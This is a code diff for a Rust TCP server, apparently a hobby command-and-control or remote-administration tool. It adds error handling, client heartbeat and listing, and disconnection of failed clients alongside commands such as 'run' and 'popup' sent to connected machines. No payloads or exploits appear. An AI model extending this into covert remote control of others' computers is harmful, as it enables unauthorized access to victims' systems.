@@ -1,14 +1,18 @@
 mod tools;
 
+
 use std::{io, thread};
+use std::f32::consts::E;
 use std::io::{BufReader, BufWriter};
 use std::net::{TcpListener, TcpStream};
 use std::sync::{Arc, Mutex};
 use std::sync::mpsc::{channel, Receiver, Sender};
+use std::time::{Duration, Instant};
 use lib::{send_data, receive_data, Command};
 use lib::CommandErr::*;
-use crate::tools::{echo, echoall, popup, run};
+use crate::tools::{echo, echoall, heartbeat, list, popup, run};
 
+pub type HandleVec = Arc<Mutex<Vec<ClientHandle>>>;
 
 type ClientHandleSender = Sender<(Command, String, Sender<Option<Vec<u8>>>)>;
 type ClientHandleReceiver = Receiver<(Command, String, Sender<Option<Vec<u8>>>)>;
@@ -20,6 +24,7 @@ struct ClientHandle {
 }
 
 impl ClientHandle {
+    // TODO: send_to_client should take a generic message, not just String
     /// Sends a message to the corresponding Client object
     fn send_to_client(&self, command: Command, message: String) -> Option<Vec<u8>> {
         // Create new channel to receive response from client
@@ -54,47 +59,59 @@ impl Client {
     }
 
     /// Waits to receive data from ClientHandle, sends response back once received from client
-    fn send_message(&mut self) {
+    fn send_message(&mut self) -> Result<(), ()> {
         // Unwrap should be fine since handle sends correct data
-        let (command, message, sender) = self.receiver.recv().unwrap();
+        let (command, message, sender) = match self.receiver.recv() {
+            Ok(data) => data,
+            Err(_) => return Err(()),
+        };
 
         let mut response_to_send = None;
 
         if send_data(command, &message, &mut self.writer).is_ok() {
             // Client should only use Command::Send to send back a response
             if let Some((Command::Send, buf)) = receive_data(&mut self.reader) {
-                // TODO: Remove unwrap
                 response_to_send = Some(buf);
             }
         }
-        sender.send(response_to_send).unwrap()
+        sender.send(response_to_send).map_err(|_| ())
     }
     fn handle_client(&mut self) {
         loop {
-            self.send_message();
+            match self.send_message() {
+                Ok(_) => continue,
+                Err(_) => return,
+            }
         }
     }
 }
 
 /// Handles commands.
-fn handle_commands(handles: Arc<Mutex<Vec<ClientHandle>>>) {
+fn handle_commands(handles: HandleVec) {
     let mut input = String::new();
     loop {
+        heartbeat(&handles);
         io::stdin().read_line(&mut input).unwrap();
         let args = input.trim().split(' ').collect::<Vec<&str>>();
 
         let command = args[0];
 
-        let error = match command {
+        let output = match command {
             "echo" => echo(args, &handles),
             "echoall" => echoall(args, &handles),
             "run" => run(args, &handles),
             "popup" => popup(args, &handles),
+            "list" => list(&handles),
             _ => Err(InvalidCommandErr("The command specified does not exist")),
         };
         
-        match error {
+        match output {
             Ok(msg) => log::info!("{}", msg),
+            Err(SendMessageErr(msg, ip)) => {
+                log::error!("{}", msg);
+                handles.lock().unwrap().retain(|handle| { handle.ip != ip });
+                log::info!("Disconnected client with IP {}", ip);
+            }
             Err(MultipleErr(vec)) => vec.iter().for_each(|err| log::error!("{}", err)),
             Err(err) => log::error!("{}", err),
         }
@@ -110,7 +127,7 @@ fn main() -> io::Result<()> {
     let listener = TcpListener::bind("127.0.0.1:4000")?;
 
     // Create synchronous vector of handles
-    let handles: Arc<Mutex<Vec<ClientHandle>>> = Arc::new(Mutex::new(Vec::new()));
+    let handles: HandleVec = Arc::new(Mutex::new(Vec::new()));
 
     // Clone handle vector to use in main thread
     let clone = handles.clone();
